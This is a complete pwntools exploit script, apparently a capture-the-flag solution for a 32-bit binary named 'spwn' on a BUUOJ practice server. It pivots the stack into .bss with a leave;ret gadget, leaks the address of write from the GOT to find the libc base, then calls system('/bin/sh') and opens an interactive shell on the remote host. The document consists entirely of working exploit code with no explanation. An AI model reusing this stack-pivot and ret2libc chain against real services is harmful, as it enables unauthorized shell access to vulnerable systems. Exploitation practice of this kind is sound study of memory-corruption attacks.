#Made by fly_autumn
#x86 pivoting+ret2libc
from pwn import *
#p = process("./spwn")
p = remote("node5.buuoj.cn",29626)
elf = ELF("./spwn")
context(os="linux",arch="i386")
libc = ELF("./libc.so.6")

offset = 28
write_plt = elf.plt["write"]
write_got = elf.got["write"]
main_addr = elf.sym["main"]
bss_addr = 0x804a300
leave_ret = 0x8048511

payload1 = b"AAAA" + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
p.recvuntil(b"name?")
p.sendline(payload1)
payload2 = b"\x00" * 24 + p32(bss_addr) + p32(leave_ret)
p.recvuntil(b"say?")
p.send(payload2)

write_addr = u32(p.recv(4))
log.success("write addr: "+hex(write_addr))
libc_addr = write_addr - libc.sym["write"]
log.success("libc addr: "+hex(libc_addr))
sys_addr = libc_addr + libc.sym["system"]
log.success("sys addr: "+hex(sys_addr))
sh_addr = libc_addr + next(libc.search("/bin/sh"))
log.success("sh addr: "+hex(sh_addr))

payload3 = b"AAAA" + p32(sys_addr) + p32(main_addr) + p32(sh_addr)
p.recvuntil(b"name?")
p.sendline(payload3)
payload4 = b"\x00" * 24 + p32(bss_addr) + p32(leave_ret)
p.recvuntil(b"say?")
p.sendline(payload4)

p.interactive()
